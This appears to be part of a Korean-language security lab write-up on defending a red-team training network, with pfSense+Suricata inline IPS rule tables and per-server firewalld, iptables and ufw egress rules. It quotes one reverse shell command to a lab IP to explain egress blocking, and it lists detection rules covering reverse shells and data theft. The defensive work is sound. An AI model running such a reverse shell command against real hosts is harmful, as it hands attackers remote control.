# 03. IPS · 서버 방화벽

IDS가 "관찰"이라면 IPS·방화벽은 "차단"이다. 이 문서는 **경계에서의 인라인 차단(IPS)** 과 **각 서버에서의 호스트 차단(방화벽)** 을 어떻게 설계했는지 다룬다.

## 목차
- [IPS 구축 — 왜 브리지(투명) 모드인가](#ips-구축--왜-브리지투명-모드인가)
- [구간별 DROP 차등 적용](#구간별-drop-차등-적용)
- [IPS 장비별 차단 룰셋](#ips-장비별-차단-룰셋)
- [Suricata 인라인 구성 포인트](#suricata-인라인-구성-포인트)
- [서버 방화벽 — 계층 방어 철학](#서버-방화벽--계층-방어-철학)
- [아웃바운드 egress 통제 (핵심)](#아웃바운드-egress-통제-핵심)
- [서버별 방화벽 설계 예시](#서버별-방화벽-설계-예시)

---

## IPS 구축 — 왜 브리지(투명) 모드인가

IPS는 트래픽을 실시간으로 끊어야 하므로 **트래픽이 반드시 통과하는 경로(인라인)** 에 있어야 한다. 문제는 **이미 구축이 끝난 인프라**에 IPS를 넣어야 했다는 점이다.

그래서 pfSense + Suricata를 **브리지(투명) 모드**로 구성했다.

- **L3 라우팅·IP 체계를 바꾸지 않는다** — 브리지는 L2에서 두 인터페이스를 묶어 투명하게 통과시키므로, 기존 게이트웨이/서브넷 설정을 건드릴 필요가 없다.
- **재설계 없이 배치 지점만 선택** — 세그먼트 앞단 어디에나 끼워 넣을 수 있다. 이 점이 **IPS를 3개 구간에 다중 배치**할 수 있었던 결정적 이유다.

```
[스위치] ──┬── (SPAN 미러) ──▶ IDS (Snort3)     ← 복제본 관찰, 차단 불가
           │
           └── (인라인 브리지) ──▶ IPS (pfSense+Suricata) ──▶ [서버 세그먼트]
                                     실제 트래픽 통과 지점 = 실시간 DROP 가능
```

---

## 구간별 DROP 차등 적용

**모든 구간에 같은 Drop 룰을 걸면 안 된다.** 구간마다 "정상 트래픽"의 성격이 다르기 때문이다. IPS에서 오탐 Drop은 곧 서비스 장애다.

| 구간 | 정상 트래픽 특성 | Drop 적용 방침 |
|---|---|---|
| **웹하드** | 대용량 파일 전송이 정상이며 오탐 시 서비스 영향이 큼 | **확정 시그니처만 Drop** (좁게) |
| **모니터링·로그 DB** | 정상 통신이 화이트리스트로 확정됨 | **Drop 적용 폭을 넓게** |
| **대외 웹서비스** | 외부 유입이 많아 공격면이 넓음 | 외부 웹 공격·정찰 1차 차단 |

> 이 판단은 IDS 룰셋 분배 정책(넓게 Alert → 확정분만 Drop)과 이어진다. IDS에서 관찰로 검증된 시그니처 중 **오탐이 낮은 것만 IPS Drop으로 승격**한다. → [02. IDS 룰셋 분배](02-ids-snort3.md#룰셋-분배-정책--alert냐-drop이냐)

---

## IPS 장비별 차단 룰셋

### IPS01 — 웹하드 (악성 파일 반입·역접속 차단)

파일 서비스이므로 **반입 → 우회 → 실행·역접속**의 단계별로 촘촘히 막았다.

| 단계 | SID | 분류 | 차단 대상 |
|---|---|---|---|
| 악성 파일 반입 | 1009201 / 1009101 / 2006001 | ownCloud / Pydio / File Upload | 웹셸 실행파일 업로드 |
| 확장자·MIME 위장 | 1009202 / 2006002 / 2009001 | ownCloud / File Upload / RLO | Content-Type 위장, RLO 파일명 위장 |
| 우회 반입(검사 후 변조) | 1001405 / 1001403 / 1009203 | FTP / ownCloud | 업로드 후 위험 확장자로 rename |
| 경로 이탈 | 1009206 / 1001212 / 1006002 | ownCloud / FTP / SMB | Directory Traversal |
| 반입 후 실행·역접속 | 5001001 / 5002001 / 2006003 | Reverse Shell / Web Shell | 웹셸 실행, 아웃바운드 C2 |
| 인증 공격·정찰 | 1009204 / 1009207 / 4008003 | ownCloud / NSE | 브루트포스, 설정파일 접근, WebDAV 정찰 |

### IPS02 — 모니터링 (관제 체계 보호·데이터 유출 차단)

관제 인프라 자체가 공격당하면 탐지 눈이 멀기 때문에, **설정 변조·비인가 접근·유출**을 막았다.

| 단계 | SID | 차단 대상 |
|---|---|---|
| 설정 변조 | 1003010 / 1003105 / 1004008 | SNMP `SetRequest` 쓰기, DNS Dynamic Update |
| 비인가 접근 | 1003110 / 1003101 / 1003001 | 비인가 SNMP 매니저, 기본 커뮤니티 `public` |
| 인프라 정찰·열거 | 1003116 / 1003012 / 4007006 | SNMP MIB Tree Walk, MariaDB 스캔 |
| 데이터 탈취 | 2001009 / 1004006 / 1004007 | `information_schema`, DNS Zone Transfer, DNS 터널링 |
| 관리 경로 위장 | 1005003 / 1008001 / 5001001 | SSH 브루트포스, Rogue DHCP, 리버스 셸 |

### IPS03 — 대외 웹서비스 (시나리오 단계별 차단)

레드팀 공격 흐름을 그대로 단계별로 막는다.

| 시나리오 단계 | SID | 차단 |
|---|---|---|
| ① 인증 우회 (login.php SQLi) | 2001006 / 2001005 / 3001001 | SQL 주석·항진식, 브루트포스 |
| ② 세션 쿠키 탈취 (Stored XSS) | 2003001 / 2003005 / 5001001 | `<script>`, `document.cookie`, 아웃바운드 |
| ③ 스키마 열거·덤프 (UNION SQLi) | 2001009 / 2001002 / 2001008 | `information_schema`, UNION+password |
| ④ 파일 업로드 리버스셸 | 2006002 / 2006003 / 2002002 | 확장자 위장, 업로드 실행, 리버스 셸 명령 |
| ⑤ RLO 위장·링크 피싱 | 2009001 / 2003004 / 2004001 | RLO 파일명, XSS Anchor, Open Redirect |
| ⑥ 접근통제 우회 | 2007001 / 2008001 | Broken Access Control, IDOR |

---

## Suricata 인라인 구성 포인트

pfSense 위에서 Suricata를 인라인(IPS) 모드로 돌릴 때 실무적으로 걸렸던 지점들:

- **오프로딩 비활성화** — 체크섬·세그먼테이션·LRO 오프로딩이 켜져 있으면 NIC이 패킷을 합쳐/변형해 올려 **Suricata가 원본 패킷을 정확히 못 본다.** 인라인에서는 반드시 꺼야 한다.
- **브리지 필터링 활성화** — `net.link.bridge.pfil_member` / `pfil_bridge`를 설정해 브리지를 통과하는 패킷이 방화벽·IPS 검사를 거치도록 한다.
- **inline 모드 + workers 러너** — `eve.json`으로 alert/drop 이벤트를 구조화 로그로 남기고, `syslog-ng`로 관제 서버(C&C)에 전송.
- **State type 룰** — pfSense 방화벽 규칙의 상태 추적과 IPS 판정을 함께 사용.

---

## 서버 방화벽 — 계층 방어 철학

경계(IPS)를 통과당해도 **각 서버가 스스로를 지키도록** 호스트 방화벽을 걸었다. 서버 역할에 따라 `iptables` / `firewalld` / `UFW`를 **차등 적용**했다.

**두 가지 대원칙:**

1. **기본 차단 + 화이트리스트** — 인바운드는 기본 `deny`, 서비스에 꼭 필요한 포트·출발지만 명시적으로 연다. 특히 **SSH는 관리자/관리망 IP에서만** 허용하고, 웹서버는 기본 SSH 서비스 자체를 제거(`remove-service=ssh`)한 뒤 Rich Rule로 관리자만 예외 허용.
2. **인바운드만이 아니라 아웃바운드도 통제** — 대부분의 호스트 방화벽이 인바운드만 막지만, 여기서는 **아웃바운드 egress**까지 통제했다. (아래 별도 절)

---

## 아웃바운드 egress 통제 (핵심)

> **왜 중요한가.** SQLi·파일 업로드로 서버가 뚫리면 공격자는 **서버가 바깥으로 연결을 여는 리버스 셸**로 제어권을 가져간다(예: `bash -i >& /dev/tcp/10.60.1.100/4444`). 인바운드만 막는 방화벽은 이걸 못 막는다. 이미 서버 안에서 *나가는* 연결이기 때문이다.
>
> 그래서 **아웃바운드 기본 차단 + 필수 통신만 허용**, 그리고 리버스 셸에 흔히 쓰이는 **Well-known 포트(4444·5555/tcp)를 명시적으로 reject** 했다. 침해를 "막는 것"과 별개로 **침해 후 확산·유출을 끊는** 계층이다.

```bash
# 웹서버(WS01) — DB 연결만 허용하고 리버스 셸 포트는 차단
firewall-cmd --permanent --remove-service=ssh                     # 기본 SSH 노출 제거
firewall-cmd --permanent --add-service=http
firewall-cmd --permanent --add-service=https
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="[관리자_IP]" port port="22" protocol="tcp" accept'
# [아웃바운드] 지정 DB(DB06:3306)만 허용, 리버스 셸 포트 reject
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" destination address="[DB06_IP]" port port="3306" protocol="tcp" accept'
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="4444" protocol="tcp" reject'
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="5555" protocol="tcp" reject'
firewall-cmd --reload
```

이 정책은 레드팀 SCN-03(리버스 셸 RCE)에서 실제로 작동했다. auditd 로그상 서버의 리버스 셸 시도가 `no route to host`로 실패했는데, **아웃바운드 차단이 C2 연결 자체를 끊었기 때문**이다. → [04. 트러블슈팅/검증](05-verification.md)

---

## 서버별 방화벽 설계 예시

역할이 다르면 위협 모델도 다르다. 대표 사례 4가지.

### DB01 — 인바운드 브루트포스 자동 차단 (`iptables recent`)

DB 포트(3306)에 대한 무차별 연결 시도를 **상태 추적으로 자동 차단**한다.

```bash
iptables -N DB_PROTECT
# 신뢰 서버는 검사 없이 통과
iptables -A INPUT -p tcp --dport 3306 -s [신뢰서버_IP] -j ACCEPT
iptables -A INPUT -p tcp --dport 3306 -j DB_PROTECT
# 60초 내 신규 연결 5회 이상이면 로그 남기고 DROP
iptables -A DB_PROTECT -m state --state NEW -m recent --name MYSQL_BRUTE --set
iptables -A DB_PROTECT -m state --state NEW -m recent --name MYSQL_BRUTE \
         --update --seconds 60 --hitcount 5 -j LOG --log-prefix "DB_BRUTE_FORCE_DETECTED: "
iptables -A DB_PROTECT -m state --state NEW -m recent --name MYSQL_BRUTE \
         --update --seconds 60 --hitcount 5 -j DROP
iptables -A DB_PROTECT -j ACCEPT
```

> **원리**: `recent` 모듈이 출발지 IP별 연결 시각을 기억해, **짧은 시간의 반복 연결**을 커널 레벨에서 걸러낸다. IDS의 `detection_filter` 임계 탐지와 같은 발상을 방화벽에서 구현한 것.

### DB03 — IP 스푸핑 무력화 (IP + MAC 동시 매칭)

백업 DB는 **IP와 MAC이 동시에 일치할 때만** 허용해 IP 스푸핑을 무력화했다. 평상시엔 아예 링크를 Down으로 격리 운영한다.

```bash
iptables -A INPUT -p tcp --dport 3306 -s [서버_IP] -m mac --mac-source [웹서버_MAC] -j ACCEPT
iptables -A INPUT -p tcp --dport 3306 -j DROP      # 그 외 전면 차단
```

### DB04 — 아웃바운드 전면 차단 정책 (firewalld policy)

로그 DB는 인가된 관제/센서 IP만 인바운드로 받고, **아웃바운드는 policy로 전면 DROP** 후 백업 동기화만 예외로 연다.

```bash
# 인바운드: MS02(관제)와 IPS/IDS 센서만 3306 허용
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="10.30.112.10" port port="3306" protocol="tcp" accept'   # MS02
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="10.30.192.13" port port="3306" protocol="tcp" accept'   # IPS01
# 아웃바운드: 전면 DROP policy 후 백업 DB05로만 예외
firewall-cmd --permanent --new-policy=outbound_drop
firewall-cmd --permanent --policy=outbound_drop --add-ingress-zone=HOST
firewall-cmd --permanent --policy=outbound_drop --add-egress-zone=ANY
firewall-cmd --permanent --policy=outbound_drop --set-target=DROP
firewall-cmd --permanent --policy=outbound_drop --add-rich-rule='rule family="ipv4" destination address="10.30.112.12" port port="3306" protocol="tcp" accept'
firewall-cmd --reload
```

### ATK(레드팀) — 공격 인프라 격리

훈련용 공격 서버조차 **실제 외부망으로 새어 나가지 않도록** egress를 훈련 타겟 대역으로만 제한했다. (안전한 훈련의 기본)

```bash
ufw default deny incoming
ufw default deny outgoing
ufw allow from [레드팀_IP] to any port 22 proto tcp
ufw allow out to 10.30.0.0/16          # 훈련 타겟 대역으로만 공격 트래픽 허용
ufw allow out to 10.40.0.0/16
ufw allow out 53/udp                    # 자체 DNS 룩업
ufw enable
```

### 방화벽 적용 요약

| 서버 | 도구 | 핵심 정책 |
|---|---|---|
| WS01/WS02 (웹) | firewalld | SSH 제거·관리자만 예외, 아웃 4444/5555 reject, WS02는 관제로 로그 전송 허용 |
| DB01 | iptables | 3306 브루트포스 `recent` 자동 차단 |
| DB03 | iptables | IP+MAC 동시 매칭, 평시 링크 Down 격리 |
| DB04/DB05 | firewalld | 인가 IP만 인바운드, 아웃바운드 policy DROP + 백업만 예외 |
| DB06 | firewalld | WS01만 3306 허용, 4444 reject, 임의 DNS(53)까지 통제 |
| MS02 (관제) | firewalld | 블루팀 IP만 관제페이지/SSH/Jupyter(8888), 화이트리스트 |
| HD01/HD02 | UFW / firewalld | 관리자 SSH만, 거부 패킷 로깅, 리버스 셸 포트 차단 |

---

### 다음 문서
→ [04. 트러블슈팅·튜닝](04-troubleshooting.md)
